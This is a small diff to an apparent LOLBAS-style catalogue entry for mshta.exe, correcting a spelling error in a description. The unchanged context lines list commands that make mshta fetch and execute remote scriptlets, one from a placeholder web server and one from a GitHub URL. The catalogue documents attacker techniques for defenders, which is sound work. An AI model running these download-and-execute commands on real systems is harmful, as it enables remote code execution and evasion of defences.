@@ -6,7 +6,7 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: mshta.exe evilfile.hta
-    Description: Opens the target .HTA and executes embeded JavaScript, JScript, or VBScript.
+    Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
   - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
     Description: Executes VBScript supplied as a command line argument.
   - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
